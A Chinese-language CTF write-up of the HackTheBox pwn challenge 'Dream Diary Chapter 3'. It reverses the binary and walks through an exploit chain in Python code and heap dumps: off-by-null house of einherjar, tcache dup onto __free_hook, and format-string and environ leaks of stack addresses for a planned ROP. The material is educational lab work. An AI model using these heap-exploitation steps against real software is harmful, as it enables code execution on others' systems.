# HTB Dream Diary Chapter 3：一道精彩的综合题-先知社区

> **来源**: https://xz.aliyun.com/news/18508  
> **文章ID**: 18508

---

## 前言

看似一道简单的堆题，实则涵盖了堆利用技巧（house of einherjar、tcache dup），格式化字符串利用（leak address），environ泄露stack地址，栈溢出（ROP->mprotect），手写shellcode绕过沙箱，绕过execve禁用完成读取文件（这里的flag文件名属于是猜不到的那种，直接ban掉了shellcode绕沙箱直接读文件的可能性）等主题，每一件事单独拿出来都不会太难，但是组合起来就....，精彩！如果要用一句话描述，那就是“从天上打到地上，从地上打到海里”

本文涵盖全流程分析，相关原理介绍，结合源码讲解关键glibc机制，来详细的呈现这个精彩的过程

## 题目情况

题目来源：HackTheBox Challenge，

题目分类：pwn，

题目难度：Hard，

题目描述：Defeating blacklists with rop and heap since before it was considered cool... You might need to adjust your heap offset by 16 bytes on the remote instance.

checksec 保护全开：

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./'
```

运行：经典菜单题

```
(venv_pwn) Dream Diary Chapter 3 ➤ ./diary3
Welcome to Dream Diary: Chapter 3!  The return of a Dream Diary with modern protections!
1. write about dream
2. edit dream
3. delete dream
4. recount dream
5. exit diary
>
```

## 逆向分析

main：

```
__int64 sub_12C7()
{
  int v1; // [rsp+8h] [rbp-28h] BYREF
  int n; // [rsp+Ch] [rbp-24h]
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  n = 0;
  sub_1215();                                   // seccomp 沙箱
  signal(14, handler);
  alarm(0x78u);
  puts("Welcome to Dream Diary: Chapter 3!  The return of a Dream Diary with modern protections!");
  setvbuf(stdout, 0LL, 2, 0LL);
  while ( n <= 99 )
  {
    fwrite(
      "1. write about dream 
2. edit dream
3. delete dream
4. recount dream
5. exit diary
",
      1uLL,
      0x53uLL,
      stderr);
    fwrite("> ", 1uLL, 2uLL, stderr);
    __isoc99_scanf("%u", &v1);
    switch ( v1 )                               // 菜单
    {
      case 1:
        sub_1447();
        break;
      case 2:
        sub_15FA();
        break;
      case 3:
        sub_17B7(1);
        break;
      case 4:
        sub_17B7(2);
        break;
      case 5:
        n = 100000;
        break;
      default:
        fwrite("invalid choice
", 1uLL, 0xFuLL, stderr);
        exit(1);
    }
    ++n;
  }
  return 0LL;
}
```

首先是沙箱，然后才是菜单

沙箱：

```
(venv_pwn) Dream Diary Chapter 3 ➤ seccomp-tools dump ./diary3
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0010
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 0012: 0x15 0x00 0x01 0x00000055  if (A != creat) goto 0014
 0013: 0x06 0x00 0x00 0x00000000  return KILL
 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

syscall黑名单：fork，execve，vfork，open，creat

菜单选项1：add

```
size_t sub_1447()
{
  unsigned int i; // [rsp+0h] [rbp-10h]
  unsigned int i_1; // [rsp+4h] [rbp-Ch]
  size_t size; // [rsp+8h] [rbp-8h] BYREF

  i_1 = 0;
  for ( i = 0; i <= 18; ++i )                   // 最多19个
  {
    if ( !LODWORD(qword_4100[2 * i]) && !qword_4100[2 * i + 1] )// 是个结构，ptr和size
    {
      i_1 = i;
      break;
    }
  }
  if ( i_1 == 18 )
    return fwrite("no more pages for dreams :(
", 1uLL, 0x1CuLL, stderr);
  fwrite("size: ", 1uLL, 6uLL, stderr);
  __isoc99_scanf("%lu", &size);
  if ( size > 0x1F0 || size <= 0x10F && size > 0xF8 )// 大小有限制
  {
    fwrite("According to research, such a dream length is impossible :(
", 1uLL, 0x3CuLL, stderr);
    exit(0);
  }
  LODWORD(qword_4100[2 * i_1]) = size;
  fwrite("data: ", 1uLL, 6uLL, stderr);
  qword_4100[2 * i_1 + 1] = (__int64)malloc(size);// 申请内存
  read(0, (void *)qword_4100[2 * i_1 + 1], size);// 写入数据
  return fwrite("done
", 1uLL, 5uLL, stderr);
}
```

使用数据结构保存申请的内存，读取大小，申请内存，写入数据

大小有限制，需要是0x1f0以内，不能是0xf8到0x10f之间

菜单选项2：edit

```
_BYTE *sub_15FA()
{
  _BYTE *result; // rax
  char buf; // [rsp+3h] [rbp-Dh] BYREF
  unsigned int idx; // [rsp+4h] [rbp-Ch] BYREF
  unsigned int ptr; // [rsp+8h] [rbp-8h]
  int var_4; // [rsp+Ch] [rbp-4h]

  fwrite("index: ", 1uLL, 7uLL, stderr);
  __isoc99_scanf("%u", &idx);
  if ( idx > 0x12 )                             // 验证索引大小
    return (_BYTE *)fwrite("invalid index
", 1uLL, 0xEuLL, stderr);
  if ( !LODWORD(qword_4100[2 * idx]) || !qword_4100[2 * idx + 1] )// 验证指针和size需要存在
    return (_BYTE *)fwrite("uafs are for noobs
", 1uLL, 0x13uLL, stderr);
  ptr = 0;
  fwrite("Input data: ", 1uLL, 0xCuLL, stderr);
  while ( ptr != LODWORD(qword_4100[2 * idx]) ) // 指针不为0
  {
    var_4 = read(0, &buf, 1uLL);                // 逐字节读取
    if ( var_4 != 1 )
    {
      fwrite("Error with writing to diary!", 1uLL, 0x1CuLL, stderr);
      exit(-1);
    }
    if ( buf == '
' || !buf )
      break;
    *(_BYTE *)(ptr++ + qword_4100[2 * idx + 1]) = buf;// 写入
  }
  result = (_BYTE *)(qword_4100[2 * idx + 1] + ptr);// 字符串最后置零
                                                // ptr[size] = 0
                                                // offbynull
  *result = 0;
  return result;
}
```

逐字节读取内容，然后写入目标缓冲区，末尾置零，存在offbynull漏洞！

菜单选项3和4在同一个函数里

```
int __fastcall sub_17B7(int n2)
{
  unsigned int idx; // [rsp+1Ch] [rbp-4h] BYREF

  fwrite("index: ", 1uLL, 7uLL, stderr);
  __isoc99_scanf("%u", &idx);
  if ( idx > 0x12 )                             // 索引范围
    return fwrite("invalid index
", 1uLL, 0xEuLL, stderr);
  if ( n2 == 1 )                                // 选项3
  {
    if ( LODWORD(qword_4100[2 * idx]) && qword_4100[2 * idx + 1] )// 需要ptr和size存在
    {
      free((void *)qword_4100[2 * idx + 1]);    // 释放内存
      qword_4100[2 * idx + 1] = 0LL;            // ptr置零
      LODWORD(qword_4100[2 * idx]) = 0;         // size 置零
      return fwrite("diary page deleted
", 1uLL, 0x13uLL, stderr);
    }
    else
    {
      return fwrite("double frees are not cool
", 1uLL, 0x1AuLL, stderr);
    }
  }                                             // 
                                                // 选项4
  else if ( LODWORD(qword_4100[2 * idx]) && qword_4100[2 * idx + 1] )
  {
    return fprintf(stderr, "
data: %s
", (const char *)qword_4100[2 * idx + 1]);// 打印指针数据
  }
  else
  {
    return fwrite("diary doesn't exist here
", 1uLL, 0x19uLL, stderr);
  }
}
```

选项3是释放内存，选项4是打印内存，都需要验证ptr和size存在

## 利用分析

存在沙箱，黑名单syscall：fork，execve，vfork，open，creat

绕过黑名单可以使用的其他组合：

1. execveat
2. openat+sendfile（需要知道目标文件名）

需要编写shellcode或者rop来完成，执行shellcode需要rop去执行mprotect，所以**目标就是rop，需要栈地址泄露和向栈内存写入数据**

glibc 版本是 2.29，申请内存大小范围是0x1f0以内，且不在0xf8~0x10f之间，使用的是tcachebin，**攻击目标优先考虑 free\_hook 指针**

综上，制定计划：

1. 2.29下的house of einherjar需要堆地址泄露伪造unsortedbin chunk指针，需要想办法泄露堆地址，修改free\_hook需要libc地址，也需要想办法泄露了
2. 漏洞是 off-by-null，可用 house of einherjar 技巧完成初步利用得到重叠块，打 tcache dup 修改 free hook 指针
3. 因为最终目标是rop或者shellcode，所以需要栈地址泄露，可通过printf来获取（也可以通过environ变量来获取）
4. 配合house of einherjar获得的重叠块二次打tcache dup控制栈内存
5. 通过rop去调用mprotect得到可执行内存，然后跳转过去
6. 需要在之前的堆内存中布局shellcode本身，shellcode绕沙箱执行execveat拿到shell
7. 绕过execve利用echo命令获取flag

### 基础函数

接下来代码中使用的python基础函数

```
def cmd(i, prompt=b"> "):
    sla(prompt, i)

def add(size:int, content:bytes):
    cmd('1')
    sla(b"size:",str(size).encode())
    sla(b"data:",content)
    
    #......

def edit(idx:int,content:bytes):
    cmd('2')
    sla(b"index:",str(idx).encode())
    sla(b"data:",content)
    #......

def dele(idx:int):
    cmd('3')
    sla(b"index:",str(idx).encode())

    #......

def show(idx:int):
    cmd('4')
    sla(b"index:",str(idx).encode())
    #......

def quit():
    cmd('5')
    #......
```

### heap address leak

```
"""
1. get heap leak
"""
add(0x18, b"leak")
add(0x18, b"leak2")
dele(0)
dele(1)
add(0x18, b"")
show(0)

ru(b"data:")
rl()
heap_leak = rl()[:-1]
heap_leak = unpack(heap_leak, "all")
heap_base = heap_leak >> 4 << 12
success(f"heap_base: {hex(heap_base)}")
```

让tcachebin chunk链表连起来，就会出现堆地址，申请写入`\`​对泄露地址没有影响，此时的堆：

```
0x55913ece2670  0x0000000000000000      0x0000000000000021      ........!.......
0x55913ece2680  0x0000000000000000      0x000055913ece1010      ...........>.U..         <-- tcachebins[0x20][0/1]

0x55913ece2690  0x0000000000000000      0x0000000000000021      ........!.......
0x55913ece26a0  0x000055913ece260a      0x0000000000000000      .&.>.U..........

0x55913ece26b0  0x0000000000000000      0x000000000001f951      ........Q.......         <-- Top chunk
```

### house of einherjar 前置基础（源码分析unsortedbin合并过程的要点）

house of einherjar是一种专门用于unsortedbin 中 off-by-null 漏洞进行利用的技巧，这里的关键是要理解unsortedbin chunk合并的过程以及其安全检查

大致原理是：

1. 释放unsortedbin chunk的时候会检查附近的chunk是否有需要合并的

1. 通过chunk header size域的P位（最后一位）进行检查，例如这个chunk的size的值是0x131，表示这个chunk的大小是0x130字节，最后的那个1标识着上面的chunk处于使用中，不可合并；
2. 向后检查的话，则检查下一个chunk的下一个chunk的size域的P位

2. 如果需要合并，就会执行合并操作
3. 通过在上面伪造一个释放了的需要合并的 unsortedbin chunk，来触发合并操作

这里的重点难点在于，如何伪造合适的 unsortedbin chunk 来通过安全检查，接下来结合源码来看看这个过程，关于伪造unsortedbin chunk相关的部分会加粗，懒得看的同学可以只看加粗的部分

首先看看合并操作的安全检查是什么：(malloc.c：)

```
        nextchunk = chunk_at_offset(p, size);

        if (__glibc_unlikely(p == av->top))
            malloc_printerr("double free or corruption (top)");
        /* Or whether the next chunk is beyond the boundaries of the arena.  */
        if (__builtin_expect(contiguous(av) && (char *)nextchunk >= ((char *)av->top + chunksize(av->top)), 0))
            malloc_printerr("double free or corruption (out)");
        /* Or whether the block is actually not marked used.  */
        if (__glibc_unlikely(!prev_inuse(nextchunk)))
            malloc_printerr("double free or corruption (!prev)");

        nextsize = chunksize(nextchunk);
        if (__builtin_expect(chunksize_nomask(nextchunk) <= 2 * SIZE_SZ, 0) || __builtin_expect(nextsize >= av->system_mem, 0))
            malloc_printerr("free(): invalid next size (normal)");
```

1. 当前需要合并的chunk不能是top chunk（当前需要释放的chunk 不能是top chunk）
2. nextchunk 的地址不能超过top chunk（需要释放的chunk的size不能太大）
3. nextchunk 的prev\_inuse位需要是1（是0意味着当前chunk已经被释放了）
4. nextchunk 的size不能小于0x10字节，不能超过av->system\_mem

然后就会开始进行合并操作，这里我们只关注和当前主题相关的向前合并的过程：

```
        if (!prev_inuse(p))
        {
            prevsize = prev_size(p);
            size += prevsize;
            p = chunk_at_offset(p, -((long)prevsize));
            if (__glibc_unlikely(chunksize(p) != prevsize))
                malloc_printerr("corrupted size vs. prev_size while consolidating");
            unlink_chunk(av, p);
        }


...


            bck = unsorted_chunks(av);
            fwd = bck->fd;
            if (__glibc_unlikely(fwd->bk != bck))
                malloc_printerr("free(): corrupted unsorted chunks");
            p->fd = fwd;
            p->bk = bck;
            if (!in_smallbin_range(size))
            {
                p->fd_nextsize = NULL;
                p->bk_nextsize = NULL;
            }
            bck->fd = p;
            fwd->bk = p;

            set_head(p, size | PREV_INUSE);
            set_foot(p, size);

            check_free_chunk(av, p);
```

p是当前chunk，prev\_inuse的值是0，说明需要向前合并

通过prev\_size来计算上一个chunk的size，基于该size去定位上一个chunk的地址

**校验prev\_size的值和上一个chunk的size是否匹配（划重点）**

然后就是得到 unsortedbin 链表，将我们准备释放的chunk插入链表，重新设置该chunk的size和nextchunk的prev\_size字段（这里是合并完之后，取最上面的chunk作为unsortedbin chunk插入链表，重新设置size字段）

**这里有一个双链表的校验：****​****​**`fwd->bk != bck`**​**​ **，校验arena中unsortedbin双链表指针的值，用人话来说就是需要我的上一个chunk的下一个chunk是我自己**

需要绕过这个校验，只需要让伪造的chunk的fd和bk都指向自己即可（这是glibc 2.29新增的机制，之前的版本没有，之前的版本只需要伪造size即可）

**综上，伪造chunk需要做的事情：**

1. **伪造prev\_size的值**
2. **伪造chunk size字段，需要等于prev\_size的值**
3. **泄露heap地址，填入fd和bk等于伪造chunk的地址**

实操流程如下：

> 利用 `off by null`​ 修改掉 `chunk`​ 的 `size`​ 域的 `P`​ 位，绕过 `unlink`​ 检查，在堆的后向合并过程中构造出 `chunk overlapping`​。
>
> * 申请 `chunk A、chunk B、chunk C、chunk D`​，`chunk D`​ 用来做 `gap`​，`chunk A、chunk C`​ 都要处于 `unsortedbin`​ 范围
> * 释放 `A`​，进入 `unsortedbin`​
> * 对 `B`​ 写操作的时候存在 `off by null`​，修改了 `C`​ 的 `P`​ 位
> * 释放 `C`​ 的时候，堆后向合并，直接把 `A、B、C`​ 三块内存合并为了一个 `chunk`​，并放到了 `unsortedbin`​ 里面
> * 读写合并后的大 `chunk`​ 可以操作 `chunk B`​ 的内容，`chunk B`​ 的头

### house of einherjar 利用

```
"""
2. offbynull: house of einherjar 
"""
# 清空已用指针，后续操作继续从0开始计算
dele(0) 

for i in range(0,7):
    add(0xf8,str(i).encode())
add(0xe8,b"7")
add(0xf8,b"8")
add(0x28,b"9")
# 将chunk8的size末尾1抹去
dele(7)
add(0xe8,b"7"*0xe8)
edit(7  ,b"7"*0xe8)
```

首先布局内存，house of einherjar 攻击的是 free 过程中处理 unsortedbin chunk 的部分，我们首先需要填充满tcachebin 才能得到free到unsortedbin的机会

然后布局一个用于溢出的chunk和被溢出的目标chunk

```
# 伪造unsortedbin chunk
dele(7)
add(0xe8,pack(0) + pack(0xe1) + pack(heap_base + 0xdc0)*2 + pack(0)*24+pack(0xe0))
# 填满tcache bin
for i in range(7):
    dele(i)
# house of einherjar!! get overlapping chunk
dele(8)
```

根据原理分析可知，我们需要在目标chunk被释放之前，将其prev\_used标志设置成0，意味着上一个chunk空闲可合并

同时配置prev\_size字段的值，指向上一个chunk，其需要满足unsortedbin chunk的fd和bk循环双链表结构，这里就需要堆地址泄露来辅助完成这件事

此时创造了一个fake chunk，内存布局如下：

```
0x55d93971fdb0  0x0000000000000000      0x00000000000000f1      ................
0x55d93971fdc0  0x0000000000000000      0x00000000000000e1      ................	// fake chunk header
0x55d93971fdd0  0x000055d93971fdc0      0x000055d93971fdc0      ..q9.U....q9.U..	// fake chunk fd & bk
0x55d93971fde0  0x0000000000000000      0x0000000000000000      ................
0x55d93971fdf0  0x0000000000000000      0x0000000000000000      ................
0x55d93971fe00  0x0000000000000000      0x0000000000000000      ................
0x55d93971fe10  0x0000000000000000      0x0000000000000000      ................
0x55d93971fe20  0x0000000000000000      0x0000000000000000      ................
0x55d93971fe30  0x0000000000000000      0x0000000000000000      ................
0x55d93971fe40  0x0000000000000000      0x0000000000000000      ................
0x55d93971fe50  0x0000000000000000      0x0000000000000000      ................
0x55d93971fe60  0x0000000000000000      0x0000000000000000      ................
0x55d93971fe70  0x0000000000000000      0x0000000000000000      ................
0x55d93971fe80  0x0000000000000000      0x0000000000000000      ................
0x55d93971fe90  0x0000000000000000      0x0000000000000000      ................

0x55d93971fea0  0x00000000000000e0      0x0000000000000100      ................	// off by null and prev_size = 0xe0
0x55d93971feb0  0x0000000000000a38      0x0000000000000000      8...............
0x55d93971fec0  0x0000000000000000      0x0000000000000000      ................
0x55d93971fed0  0x0000000000000000      0x0000000000000000      ................
0x55d93971fee0  0x0000000000000000      0x0000000000000000      ................
0x55d93971fef0  0x0000000000000000      0x0000000000000000      ................
0x55d93971ff00  0x0000000000000000      0x0000000000000000      ................
0x55d93971ff10  0x0000000000000000      0x0000000000000000      ................
0x55d93971ff20  0x0000000000000000      0x0000000000000000      ................
0x55d93971ff30  0x0000000000000000      0x0000000000000000      ................
0x55d93971ff40  0x0000000000000000      0x0000000000000000      ................
0x55d93971ff50  0x0000000000000000      0x0000000000000000      ................
0x55d93971ff60  0x0000000000000000      0x0000000000000000      ................
0x55d93971ff70  0x0000000000000000      0x0000000000000000      ................
0x55d93971ff80  0x0000000000000000      0x0000000000000000      ................
0x55d93971ff90  0x0000000000000000      0x0000000000000000      ................

0x55d93971ffa0  0x0000000000000000      0x0000000000000031      ........1.......
0x55d93971ffb0  0x0000000000000a39      0x0000000000000000      9...............
0x55d93971ffc0  0x0000000000000000      0x0000000000000000      ................

0x55d93971ffd0  0x0000000000000000      0x000000000001f031      ........1.......
```

释放chunk 8之后，得到重叠chunk：

```
0x560cb8f6fdb0  0x0000000000000000      0x00000000000000f1      ................		// chunk7，tcachebin chunk
0x560cb8f6fdc0  0x0000000000000000      0x00000000000001e1      ................         <-- unsortedbin[all][0]
0x560cb8f6fdd0  0x00007f1bcddfaca0      0x00007f1bcddfaca0      ................		// overlap chunk
0x560cb8f6fde0  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6fdf0  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6fe00  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6fe10  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6fe20  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6fe30  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6fe40  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6fe50  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6fe60  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6fe70  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6fe80  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6fe90  0x0000000000000000      0x0000000000000000      ................

0x560cb8f6fea0  0x00000000000000e0      0x0000000000000100      ................
0x560cb8f6feb0  0x0000000000000a38      0x0000000000000000      8...............
0x560cb8f6fec0  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6fed0  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6fee0  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6fef0  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6ff00  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6ff10  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6ff20  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6ff30  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6ff40  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6ff50  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6ff60  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6ff70  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6ff80  0x0000000000000000      0x0000000000000000      ................
0x560cb8f6ff90  0x0000000000000000      0x0000000000000000      ................

0x560cb8f6ffa0  0x00000000000001e0      0x0000000000000030      ........0.......
0x560cb8f6ffb0  0x0000000000000a39      0x0000000000000000      9...............
0x560cb8f6ffc0  0x0000000000000000      0x0000000000000000      ................

0x560cb8f6ffd0  0x0000000000000000      0x000000000001f031      ........1.......         <-- Top chunk
```

### libc address leak

```
"""
3. libc address leak
"""
dele(7)
add(0xe8,cyclic(0xf))
show(0)
ru(b"data:")
rl()

libc_leak = rl()[:-1]
libc_leak = unpack(libc_leak, "all")
libc.address = libc_leak  -0x1e4ca0
success(f"heap_base: {hex(heap_base)}")
success(f"libc.address: {hex(libc.address)}")
```

此时chunk 7 内部出现了libc地址，只需要重新申请chunk7去打印即可，因为之前释放了0-6的chunk，所以索引从0开始了

此时的内存：

```
0x558c3f2b5db0  0x0000000000000000      0x00000000000000f1      ................
0x558c3f2b5dc0  0x6161616261616161      0x0a61616461616163      aaaabaaacaaadaa.         <-- unsortedbin[all][0]
0x558c3f2b5dd0  0x00007fcc16cebca0      0x00007fcc16cebca0      ................
0x558c3f2b5de0  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5df0  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5e00  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5e10  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5e20  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5e30  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5e40  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5e50  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5e60  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5e70  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5e80  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5e90  0x0000000000000000      0x0000000000000000      ................

0x558c3f2b5ea0  0x00000000000000e0      0x0000000000000100      ................
0x558c3f2b5eb0  0x0000000000000a38      0x0000000000000000      8...............
0x558c3f2b5ec0  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5ed0  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5ee0  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5ef0  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5f00  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5f10  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5f20  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5f30  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5f40  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5f50  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5f60  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5f70  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5f80  0x0000000000000000      0x0000000000000000      ................
0x558c3f2b5f90  0x0000000000000000      0x0000000000000000      ................

0x558c3f2b5fa0  0x00000000000001e0      0x0000000000000030      ........0.......
0x558c3f2b5fb0  0x0000000000000a39      0x0000000000000000      9...............
0x558c3f2b5fc0  0x0000000000000000      0x0000000000000000      ................

0x558c3f2b5fd0  0x0000000000000000      0x000000000001f031      ........1.......         <-- Top chunk
```

unsortedbin chunk 的 size被损坏了，需要修复一下：

```
# 还原unsortedbin chunk 的各个字段
dele(0)
add(0xe8,pack(0)+pack(0x1e1) + pack(libc_leak)*2)
```

### tcache dup 一个小细节

对于glibc 2.29下的tcache，在malloc时候，不检查count的值，只关注指针，所以不需要释放无效chunk去增加count字段的值

```
  if (tc_idx < mp_.tcache_bins
      /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */
      && tcache
      && tcache->entries[tc_idx] != NULL)
    {
      return tcache_get (tc_idx);
    }
```

### tcache dup with \_\_free\_hook -> printf 格式化字符串泄露栈地址

接下来的操作就是基于重叠块打tcache dup，得到任意内存申请（也就可以读和写），目标是获得栈地址

思路1：改 free hook 为 printf 通过格式化字符串去获取栈地址泄露

思路2：申请environ附近的地址去泄露stack地址

其实都可行，这里分别都列出来打法，先是思路1：

```
"""
4. tcache dup with __free_hook -> printf
"""
# 获取重叠块 2个
add(0x28,b"1")
add(0x128,b"2")
dele(1)
dele(2)
# overwrite tcachebin chunk 1's next ptr
dele(0)
add(0xe8,pack(0)+pack(0x31)+pack(libc.sym.__free_hook))
# 之后没有free了，提前free掉先
dele(0)
# 准备格式化字符串
add(0x28,b"%p
"*5) # 0
# 覆盖free hook
add(0x28,pack(libc.sym.printf))
# 泄露栈地址
dele(0)
rl()
rl()
rl()
stack_leak = rl()
stack_leak = int(stack_leak,16)
success(f"stack_leak: {hex(stack_leak)}")
```

因为得到栈地址之后，还需一次任意内存申请，需要准备2个重叠块，这里提前释放掉用于覆盖next指针的chunk，因为覆盖free hook之后无free可用了就

然后常规的tcache dup打free hook修改为printf函数

通过提前构造好的格式化字符串语句，泄露出参数中的地址：

```
0x557cd97df8ab
(nil)
(nil)
0x7ffc140e41d1
(nil)
```

其中，第4个是栈地址，直接获取拿捏！

下一步就是找到需要触发 ROP 的地方，然后再次tcache dup进行覆盖，覆盖完成之后开始打ROP

### tcache dup to environ -> 泄露栈地址

这是另一种获取栈地址泄露的方式，可以与上面打free hook的方法互换，这里也进行介绍和实验，后续文章还是延续之前利用printf获取栈地址的方法写后续

environ是libc和stack地址连接的桥梁，通过泄露environ变量的值，可以泄露出stack地址

```
"""
4. tcache dup with environ
"""
# 获取重叠块 2个
add(0x28,b"1")  # 打 free hook
add(0x128,b"2") # 打 stack
dele(1) 
dele(2)
# overwrite tcachebin chunk 1's next ptr
dele(0)
# 方案2: 从environ获取
add(0xe8,pack(0)+pack(0x31)+pack(libc.sym.environ-0x10))
dele(0)
add(0x28,b"")
add(0x28,cyclic(0xf))
show(1)
ru(b"data")
rl()
stack_leak = rl()[:-1]
stack_leak = unpack(stack_leak, "all")
success(f"stack_leak: {hex(stack_leak)}")
```

直接重叠块申请走environ变量附近的内存，然后打印泄露environ的值，便是栈地址

获取到的地址：

```
[+] stack_leak: 0x7ffcb920af18

pwndbg> vmmap 0x7ffcb920af18
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File (set vmmap-prefer-relpaths on)
    0x7f7a18406000     0x7f7a18407000 rw-p     1000      0 [anon_7f7a18406]
►   0x7ffcb91ec000     0x7ffcb920e000 rw-p    22000      0 [stack] +0x1ef18
    0x7ffcb9312000     0x7ffcb9316000 r--p     4000      0 [vvar]
```

### tcache dup to stack -> ROP

再次回顾main函数：

```
__int64 sub_12C7()
{
  int v1; // [rsp+8h] [rbp-28h] BYREF
  int n; // [rsp+Ch] [rbp-24h]
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  n = 0;
  sub_1215();                                   // seccomp 沙箱
  signal(14, handler);
  alarm(0x78u);
  puts("Welcome to Dream Diary: Chapter 3!  The return of a Dream Diary with modern protections!");
  setvbuf(stdout, 0LL, 2, 0LL);
  while ( n <= 99 )
  {
    fwrite(
      "1. write about dream 
2. edit dream
3. delete dream
4. recount dream
5. exit diary
",
      1uLL,
      0x53uLL,
      stderr);
    fwrite("> ", 1uLL, 2uLL, stderr);
    __isoc99_scanf("%u", &v1);
    switch ( v1 )                               // 菜单
    {
      case 1:
        sub_1447();
        break;
      case 2:
        sub_15FA();
        break;
      case 3:
        sub_17B7(1);
        break;
      case 4:
        sub_17B7(2);
        break;
      case 5:
        n = 100000;
        break;
      default:
        fwrite("invalid choice
", 1uLL, 0xFuLL, stderr);
        exit(1);
    }
    ++n;
  }
  return 0LL;
}
```

这里的参数除了1234常规的增删改查外，还有个5，这里的函数返回正好可以用于触发ROP

```
pwndbg> retaddr
0x7ffd9067b4a8 —▸ 0x7fc8df45ee50 (_IO_file_underflow+336) ◂— test rax, rax
0x7ffd9067b4e8 —▸ 0x7fc8df460182 (_IO_default_uflow+50) ◂— cmp eax, -1
0x7ffd9067b508 —▸ 0x7fc8df433da0 ◂— mov rcx, 0xfffffffffffffffe
0x7ffd9067bc28 —▸ 0x7fc8df432cab (__isoc99_scanf+171) ◂— mov rcx, qword ptr [rsp + 0x18]
0x7ffd9067bd08 —▸ 0x56041aa68391 ◂— mov eax, dword ptr [rbp - 0x28]
0x7ffd9067bd48 —▸ 0x7fc8df3f5b6b (__libc_start_main+235) ◂— mov edi, eax
0x7ffd9067be08 —▸ 0x56041aa6815a ◂— hlt
```

main函数会返回到\_\_libc\_start\_main函数，所以目标地址就是0x7ffd9067bd48，去tcache覆盖这里即可

此时的内存：

```
0x560445b62db0  0x0000000000000000      0x00000000000000f1      ................
0x560445b62dc0  0x0000000000000000      0x0000560445b61010      ...........E.V..         <-- tcachebins[0xf0][0/1]
0x560445b62dd0  0x70250a70250a7025      0x0a0a70250a70250a      %p.%p.%p.%p.%p..	// 用过的重叠块
0x560445b62de0  0x000000000000000a      0x0000000000000000      ................
0x560445b62df0  0x0000000000000000      0x0000000000000131      ........1.......
0x560445b62e00  0x0000000000000000      0x0000560445b61010      ...........E.V..         <-- tcachebins[0x130][0/1]
0x560445b62e10  0x0000000000000000      0x0000000000000000      ................	// 第二个重叠块
0x560445b62e20  0x0000000000000000      0x0000000000000000      ................
0x560445b62e30  0x0000000000000000      0x0000000000000000      ................
0x560445b62e40  0x0000000000000000      0x0000000000000000      ................
0x560445b62e50  0x0000000000000000      0x0000000000000000      ................
0x560445b62e60  0x0000000000000000      0x0000000000000000      ................
0x560445b62e70  0x0000000000000000      0x0000000000000000      ................
0x560445b62e80  0x0000000000000000      0x0000000000000000      ................
0x560445b62e90  0x0000000000000000      0x0000000000000000      ................
0x560445b62ea0  0x00000000000000e0      0x0000000000000100      ................
0x560445b62eb0  0x0000000000000a38      0x0000000000000000      8...............
0x560445b62ec0  0x0000000000000000      0x0000000000000000      ................
0x560445b62ed0  0x0000000000000000      0x0000000000000000      ................
